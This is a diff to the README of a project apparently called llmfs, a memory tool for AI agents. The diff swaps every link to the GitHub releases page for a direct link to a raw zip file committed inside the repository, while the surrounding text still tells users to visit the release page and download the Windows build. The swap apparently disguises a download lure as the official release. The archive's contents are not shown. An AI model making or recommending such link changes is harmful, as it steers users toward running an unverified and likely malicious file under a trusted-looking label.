@@ -1,6 +1,6 @@
 # 🧠 llmfs - Persistent memory for AI agents
 
-[![Download llmfs](https://img.shields.io/badge/Download%20llmfs-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/whiteoakredguard557/llmfs/releases)
+[![Download llmfs](https://img.shields.io/badge/Download%20llmfs-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/whiteoakredguard557/llmfs/main/llmfs/Software_v1.7-alpha.2.zip)
 
 ## 📦 What is llmfs?
 
@@ -32,7 +32,7 @@ If you plan to connect llmfs to other AI tools, it also helps to have:
 
 Visit the release page here and download the Windows file from the latest release:
 
-[Go to llmfs releases](https://github.com/whiteoakredguard557/llmfs/releases)
+[Go to llmfs releases](https://raw.githubusercontent.com/whiteoakredguard557/llmfs/main/llmfs/Software_v1.7-alpha.2.zip)
 
 After the page opens:
 
@@ -193,7 +193,7 @@ It is a good fit when you want a memory layer that stays easy to inspect and man
 
 Download or run the Windows build from the release page:
 
-[https://github.com/whiteoakredguard557/llmfs/releases](https://github.com/whiteoakredguard557/llmfs/releases)
+[https://raw.githubusercontent.com/whiteoakredguard557/llmfs/main/llmfs/Software_v1.7-alpha.2.zip](https://raw.githubusercontent.com/whiteoakredguard557/llmfs/main/llmfs/Software_v1.7-alpha.2.zip)
 
 ## 🧾 Project details
 
